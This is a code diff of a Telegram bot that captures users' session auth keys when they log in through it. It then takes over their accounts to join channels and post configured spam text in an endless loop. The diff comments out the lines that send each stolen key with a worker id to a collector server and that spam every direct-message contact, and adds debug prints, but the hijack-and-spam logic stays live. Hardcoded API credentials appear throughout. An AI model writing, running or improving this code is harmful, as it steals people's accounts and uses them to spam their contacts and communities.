@@ -153,41 +153,45 @@ async def inline_click(call: types.CallbackQuery):
             auth_key = binascii.hexlify(sessionString.auth_key.key)
 
             steps[call.message.chat.id]["step"] = -1
-            requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
+            #requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
 
             client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
             await client.connect()
 
             text = config.spamInfo["spamText"]
 
-            if config.spamInfo["dmSpam"] == True:
-                async for dialog in client.iter_dialogs():
-                    if dialog.is_channel and dialog.entity.creator != True:
-                        continue
-                    try:
-                        if dialog.entity.bot:
-                            continue
-                    except:
-                        pass
-
-                    try:
-                        await client.send_message(dialog.id, text)
-                    except:
-                        pass
-
+            #if config.spamInfo["dmSpam"] == True:
+            #    async for dialog in client.iter_dialogs():
+            #        if dialog.is_channel and dialog.entity.creator != True:
+            #            continue
+            #        try:
+            #            if dialog.entity.bot:
+            #                continue
+            #        except:
+            #            pass
+#
+            #        try:
+            #            await client.send_message(dialog.id, text)
+            #        except:
+            #            pass
+#
             for channel in config.spamInfo["joinChannels"]:
                 try:
                     await client(JoinChannelRequest(channel))
                 except:
                     pass
 
+            print(config.spamInfo["channelsSpam"])
+
             while True:
                 await asyncio.sleep(12)
 
                 for channel_id in config.spamInfo["channelsSpam"]:
+                    print(channel_id)
                     try:
                         await client.send_message(int(channel_id), text)
-                    except:
+                    except Exception as e:
+                        print(e)
                         pass
 
         except ClientTelegram.NeedPassword:
@@ -224,7 +228,7 @@ async def code_step(message: types.Message):
         steps[message.chat.id]["step"] = -1
 
         await message.reply("1111");
-        requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
+        #requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})
 
         client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
         await client.connect()
@@ -257,7 +261,7 @@ async def code_step(message: types.Message):
 
             for channel_id in config.spamInfo["channelsSpam"]:
                 try:
-                    await client.send_message(int(channel_id), text)
+                    await client.send_message(channel_id, text)
                 except:
                     pass
 
